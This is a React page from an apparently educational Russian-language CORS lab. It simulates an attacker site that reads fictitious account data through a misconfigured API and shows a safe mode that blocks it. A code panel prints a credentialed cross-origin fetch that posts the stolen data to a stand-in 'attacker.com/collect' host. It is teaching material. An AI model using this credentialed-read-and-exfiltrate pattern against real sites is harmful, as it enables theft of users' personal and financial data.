'use client'

import { useState, useEffect } from "react";
import { useTheme } from "next-themes";
import {
  Bug,
  Skull,
  RefreshCw,
  ArrowLeft,
  AlertTriangle,
  Eye,
  ShieldAlert,
  Terminal,
  Moon,
  Sun,
  ArrowUp,
  KeyRound,
  Code2,
  ExternalLink,
  BookOpen,
} from "lucide-react";
import { Button } from "@/components/ui/button";
import {
  Card,
  CardContent,
  CardDescription,
  CardHeader,
  CardTitle,
} from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Separator } from "@/components/ui/separator";
import Link from "next/link";

interface AccountData {
  username: string; email: string; accessLevel: string;
  balance: string; accountNumber: string; lastLogin: string;
}
interface CorsInfo {
  mode: "vulnerable" | "safe"; origin: string | null;
  accessControlAllowOrigin: string | null;
  accessControlAllowCredentials: string | null;
  allowed: boolean; reason: string;
}
interface AccountResponse { data: AccountData | null; cors: CorsInfo; }

function ScrollToTopButton() {
  const [visible, setVisible] = useState(false);
  useEffect(() => {
    const onScroll = () => setVisible(window.scrollY > 300);
    window.addEventListener("scroll", onScroll, { passive: true });
    return () => window.removeEventListener("scroll", onScroll);
  }, []);
  if (!visible) return null;
  return (
    <button
      onClick={() => window.scrollTo({ top: 0, behavior: "smooth" })}
      className="fixed bottom-6 right-6 z-50 flex items-center justify-center w-11 h-11 rounded-full bg-red-700/70 text-white shadow-lg hover:bg-red-700/90 transition-all hover:scale-110 backdrop-blur-sm"
      aria-label="Наверх"
    >
      <ArrowUp className="h-5 w-5" />
    </button>
  );
}

export default function AttackerPage() {
  const [stolenData, setStolenData] = useState<AccountData | null>(null);
  const [corsInfo, setCorsInfo] = useState<CorsInfo | null>(null);
  const [loading, setLoading] = useState(false);
  const [attackLog, setAttackLog] = useState<string[]>([]);
  const [mounted, setMounted] = useState(false);
  const { theme, setTheme } = useTheme();

  useEffect(() => { setMounted(true); }, []);

  const addLog = (msg: string) => {
    setAttackLog((prev) => [...prev, `[${new Date().toLocaleTimeString()}] ${msg}`]);
  };

  const launchAttack = async () => {
    setLoading(true);
    setStolenData(null); setCorsInfo(null); setAttackLog([]);
    addLog("Запуск атаки: кросс-доменный запрос к /api/account...");
    addLog("fetch('/api/account', { credentials: 'include', headers: { 'X-Simulated-Origin': 'https://evil-phishing.com' } })");
    try {
      const res = await fetch("/api/account", {
        credentials: "include",
        headers: { "X-Simulated-Origin": "https://evil-phishing.com" },
      });
      const data: AccountResponse = await res.json();
      addLog(`Статус: ${res.status}`);
      addLog(`Origin: ${data.cors.origin || "отсутствует"}`);
      addLog(`ACAO: ${data.cors.accessControlAllowOrigin || "не установлен"}`);
      addLog(`ACAC: ${data.cors.accessControlAllowCredentials || "не установлен"}`);
      if (data.cors.allowed) {
        addLog("⚠ CORS разрешил доступ! Данные получены атакующим.");
      } else {
        addLog("✓ CORS заблокировал доступ. Атака не удалась.");
      }
      setCorsInfo(data.cors);
      setStolenData(data.data);
    } catch (err) {
      addLog(`Ошибка: ${err instanceof Error ? err.message : "Неизвестная"}`);
    } finally { setLoading(false); }
  };

  return (
    <div className="min-h-screen flex flex-col bg-background text-foreground">
      {/* HEADER */}
      <header className="border-b border-red-800/50 dark:border-red-900/50 bg-card sticky top-0 z-40">
        <div className="max-w-6xl mx-auto px-3 sm:px-4 lg:px-6 py-2.5 sm:py-4">
          <div className="flex items-center justify-between gap-2 sm:gap-3">
            <div className="flex items-center gap-2 sm:gap-3 min-w-0">
              <div className="p-1.5 sm:p-2 rounded-lg bg-red-100 text-red-600 dark:bg-red-950/50 dark:text-red-400 flex-shrink-0">
                <Skull className="h-4 w-4 sm:h-6 sm:w-6" />
              </div>
              <div className="min-w-0">
                <h1 className="text-sm sm:text-xl font-bold tracking-tight text-red-600 dark:text-red-400 truncate">
                  Страница атаки (evil.com)
                </h1>
                <p className="text-[10px] sm:text-sm text-muted-foreground truncate">
                  Имитация вредоносного сайта
                </p>
              </div>
            </div>
            <div className="flex items-center gap-2 flex-shrink-0">
              <Link href="/">
                <Button variant="outline" size="sm" className="text-xs sm:text-sm">
                  <ArrowLeft className="mr-1 sm:mr-2 h-3 w-3 sm:h-4 sm:w-4" />
                  <span className="hidden xs:inline">Вернуться</span>
                  <span className="xs:hidden">Назад</span>
                </Button>
              </Link>
              {mounted && (
                <Button
                  variant="outline"
                  size="icon"
                  onClick={() => setTheme(theme === "dark" ? "light" : "dark")}
                  aria-label="Переключить тему"
                  className="h-8 w-8 sm:h-9 sm:w-9 flex-shrink-0"
                >
                  {theme === "dark" ? <Sun className="h-4 w-4" /> : <Moon className="h-4 w-4" />}
                </Button>
              )}
            </div>
          </div>
        </div>
      </header>

      <main className="flex-1 max-w-6xl mx-auto px-3 sm:px-4 lg:px-6 py-4 sm:py-6 space-y-4 sm:space-y-6">
        {/* Warning */}
        <Alert variant="destructive">
          <AlertTriangle className="h-4 w-4" />
          <AlertTitle className="text-xs sm:text-sm">Это учебная страница атаки</AlertTitle>
          <AlertDescription className="text-[11px] sm:text-sm">
            Данная страница имитирует действия злоумышленника. Все данные фиктивные.
            В реальной атаке эта страница находилась бы на совершенно другом домене.
          </AlertDescription>
        </Alert>

        {/* Attack steps */}
        <Card>
          <CardHeader className="p-4 sm:p-6 pb-2 sm:pb-3">
            <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
              <Bug className="h-5 w-5 text-red-500" />
              Как работает атака
            </CardTitle>
          </CardHeader>
          <CardContent className="px-4 sm:px-6 pb-4 sm:pb-6">
            <div className="grid gap-2 sm:gap-3">
              {[
                { step: "1", title: "Жертва авторизуется", desc: "Браузер сохраняет cookie для домена.", icon: <KeyRound className="h-4 w-4" /> },
                { step: "2", title: "Жертва посещает evil.com", desc: "Через фишинг, рекламу или ссылку.", icon: <Skull className="h-4 w-4" /> },
                { step: "3", title: "fetch() с credentials", desc: "Браузер прикрепляет cookie автоматически.", icon: <Code2 className="h-4 w-4" /> },
                { step: "4", title: "Сервер отражает Origin", desc: "ACAO: evil.com + ACAC: true → браузер разрешает чтение.", icon: <AlertTriangle className="h-4 w-4" /> },
                { step: "5", title: "Данные украдены", desc: "Атакующий получает баланс, email, номер счёта.", icon: <Eye className="h-4 w-4" /> },
              ].map((item) => (
                <div key={item.step} className="flex gap-2 sm:gap-3 p-2.5 sm:p-3 rounded-lg bg-muted/50 border">
                  <div className="flex-shrink-0 w-7 h-7 sm:w-8 sm:h-8 rounded-full bg-red-100 text-red-600 dark:bg-red-950/50 dark:text-red-400 flex items-center justify-center text-xs sm:text-sm font-bold">
                    {item.step}
                  </div>
                  <div>
                    <h4 className="text-xs sm:text-sm font-medium flex items-center gap-1.5">{item.icon} {item.title}</h4>
                    <p className="text-[10px] sm:text-xs text-muted-foreground mt-0.5">{item.desc}</p>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>

        {/* Attack button */}
        <Card className="border-red-200 dark:border-red-900/50">
          <CardHeader className="p-4 sm:p-6 pb-2 sm:pb-3">
            <CardTitle className="flex items-center gap-2 text-red-600 dark:text-red-400 text-base sm:text-lg">
              <ShieldAlert className="h-5 w-5" />
              Эксплуатация уязвимости
            </CardTitle>
          </CardHeader>
          <CardContent className="px-4 sm:px-6 pb-4 sm:pb-6 space-y-3 sm:space-y-4">
            <Button onClick={launchAttack} disabled={loading} variant="destructive" size="lg" className="w-full sm:w-auto">
              {loading ? <RefreshCw className="mr-2 h-5 w-5 animate-spin" /> : <Bug className="mr-2 h-5 w-5" />}
              Получить данные жертвы
            </Button>

            {attackLog.length > 0 && (
              <div className="bg-muted rounded-lg p-3 sm:p-4 font-mono text-[10px] sm:text-xs space-y-1 max-h-36 sm:max-h-48 overflow-y-auto">
                <div className="text-emerald-600 dark:text-emerald-400 mb-1.5 sm:mb-2">
                  <Terminal className="inline h-3 w-3 mr-1" /> Лог атаки:
                </div>
                {attackLog.map((log, i) => (
                  <div key={i} className={log.includes("⚠") ? "text-red-600 dark:text-red-400" : log.includes("✓") ? "text-emerald-600 dark:text-emerald-400" : "text-muted-foreground"}>
                    {log}
                  </div>
                ))}
              </div>
            )}

            {stolenData && (
              <div className="space-y-2 sm:space-y-3">
                <h3 className="text-xs sm:text-sm font-semibold text-red-600 dark:text-red-400 flex items-center gap-2">
                  <Eye className="h-4 w-4" /> Украденные данные:
                </h3>
                <div className="bg-red-50 border border-red-200 dark:bg-red-950/30 dark:border-red-800 rounded-lg p-3 sm:p-4 font-mono text-[10px] sm:text-sm space-y-1 sm:space-y-2">
                  <div className="text-red-700 dark:text-red-300"><span className="text-muted-foreground">username:</span> {stolenData.username}</div>
                  <div className="text-red-700 dark:text-red-300"><span className="text-muted-foreground">email:</span> {stolenData.email}</div>
                  <div className="text-red-700 dark:text-red-300 font-bold"><span className="text-muted-foreground">balance:</span> {stolenData.balance}</div>
                  <div className="text-red-700 dark:text-red-300"><span className="text-muted-foreground">accountNumber:</span> {stolenData.accountNumber}</div>
                </div>
              </div>
            )}

            {corsInfo && !corsInfo.allowed && (
              <div className="bg-emerald-50 border border-emerald-200 dark:bg-emerald-950/30 dark:border-emerald-800 rounded-lg p-3 sm:p-4">
                <div className="flex items-center gap-2 text-emerald-600 dark:text-emerald-400 text-xs sm:text-sm font-semibold mb-1.5 sm:mb-2">
                  <ShieldAlert className="h-4 w-4" /> Атака заблокирована!
                </div>
                <p className="text-[11px] sm:text-sm text-emerald-700 dark:text-emerald-300">
                  Безопасный режим CORS отклонил запрос с неизвестного Origin. {corsInfo.reason}
                </p>
              </div>
            )}

            {corsInfo && (
              <div className="bg-muted rounded-lg p-3 sm:p-4 text-[10px] sm:text-xs font-mono space-y-1.5 sm:space-y-2">
                <h4 className="text-muted-foreground mb-1">CORS-заголовки:</h4>
                <div className="grid grid-cols-2 gap-1.5 sm:gap-2">
                  <div className="text-muted-foreground">Режим:</div>
                  <div className={corsInfo.mode === "vulnerable" ? "text-red-600 dark:text-red-400" : "text-emerald-600 dark:text-emerald-400"}>{corsInfo.mode === "vulnerable" ? "Уязвимый" : "Безопасный"}</div>
                  <div className="text-muted-foreground">Origin:</div>
                  <div className="text-foreground break-all">{corsInfo.origin || "—"}</div>
                  <div className="text-muted-foreground">ACAO:</div>
                  <div className={corsInfo.accessControlAllowOrigin ? "text-red-600 dark:text-red-400 break-all" : "text-emerald-600 dark:text-emerald-400"}>{corsInfo.accessControlAllowOrigin || "не установлен"}</div>
                  <div className="text-muted-foreground">ACAC:</div>
                  <div className={corsInfo.accessControlAllowCredentials === "true" ? "text-red-600 dark:text-red-400" : "text-emerald-600 dark:text-emerald-400"}>{corsInfo.accessControlAllowCredentials || "не установлен"}</div>
                </div>
              </div>
            )}
          </CardContent>
        </Card>

        {/* Attacker code */}
        <Card>
          <CardHeader className="p-4 sm:p-6 pb-2 sm:pb-3">
            <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
              <Code2 className="h-5 w-5" />
              Код атакующего
            </CardTitle>
          </CardHeader>
          <CardContent className="px-4 sm:px-6 pb-4 sm:pb-6">
            <div className="bg-muted rounded-lg p-2.5 sm:p-4 font-mono text-[10px] sm:text-xs overflow-x-auto space-y-1">
              <div className="text-red-600 dark:text-red-400">{'// Код на evil-phishing.com'}</div>
              <div>fetch(<span className="text-red-600 dark:text-red-400">"https://victim.com/api/account"</span>, {"{"}</div>
              <div className="ml-3 sm:ml-4">credentials: <span className="text-red-600 dark:text-red-400">"include"</span></div>
              <div>{"}"}).then(res =&gt; res.json()).then(data =&gt; {"{"}</div>
              <div className="ml-3 sm:ml-4">fetch(<span className="text-red-600 dark:text-red-400">"https://attacker.com/collect"</span>, {"{"}</div>
              <div className="ml-6 sm:ml-8">method: <span className="text-red-600 dark:text-red-400">"POST"</span>,</div>
              <div className="ml-6 sm:ml-8">body: JSON.stringify(data)</div>
              <div className="ml-3 sm:ml-4">{"}"});</div>
              <div>{"}"});</div>
            </div>
          </CardContent>
        </Card>

        {/* Literature on attacker page too */}
        <Card>
          <CardHeader className="p-4 sm:p-6 pb-2 sm:pb-3">
            <CardTitle className="flex items-center gap-2 text-base sm:text-lg">
              <BookOpen className="h-5 w-5" />
              Ресурсы для изучения
            </CardTitle>
          </CardHeader>
          <CardContent className="px-4 sm:px-6 pb-4 sm:pb-6 space-y-1.5">
            {[
              { url: "https://portswigger.net/web-security/cors", label: "PortSwigger: CORS Vulnerabilities" },
              { url: "https://developer.mozilla.org/ru/docs/Web/HTTP/CORS", label: "MDN: CORS (на русском)" },
              { url: "https://owasp.org/www-community/attacks/CORS_OriginHeaderScrutiny", label: "OWASP: CORS Attack" },
              { url: "https://cheatsheetseries.owasp.org/cheatsheets/CORS_Cheat_Sheet.html", label: "OWASP CORS Cheat Sheet" },
            ].map((link, i) => (
              <a key={i} href={link.url} target="_blank" rel="noopener noreferrer" className="flex items-center gap-2 text-[11px] sm:text-sm text-primary hover:underline">
                <ExternalLink className="h-3 w-3 sm:h-3.5 sm:w-3.5 flex-shrink-0" />
                <span className="truncate">{link.label}</span>
              </a>
            ))}
          </CardContent>
        </Card>

        {/* Hint */}
        <Card>
          <CardContent className="p-3 sm:p-4">
            <div className="flex items-start gap-2 sm:gap-3">
              <AlertTriangle className="h-4 w-4 sm:h-5 sm:w-5 text-amber-500 mt-0.5 flex-shrink-0" />
              <div className="text-[11px] sm:text-sm text-muted-foreground">
                <p className="font-medium text-foreground">Переключите режим на главной странице</p>
                <p className="mt-1">Переключитесь на <Badge variant="default" className="text-[9px] sm:text-xs">Безопасный режим</Badge> и повторите атаку — данные будут защищены.</p>
              </div>
            </div>
          </CardContent>
        </Card>
      </main>

      {/* FOOTER */}
      <footer className="border-t bg-card mt-auto">
        <div className="max-w-6xl mx-auto px-3 sm:px-4 lg:px-6 py-4 sm:py-6">
          <div className="flex flex-col items-center gap-2 sm:gap-3">
            <p className="text-[10px] sm:text-sm text-muted-foreground text-center">
              Учебный стенд · Имитация атаки · Все данные фиктивные
            </p>
            <Separator className="max-w-[120px] sm:max-w-xs" />
            <p className="text-xs sm:text-sm font-semibold tracking-widest text-foreground">
              создатель <span className="text-red-600 dark:text-red-400">AZAR</span>
            </p>
          </div>
        </div>
      </footer>

      <ScrollToTopButton />
    </div>
  );
}
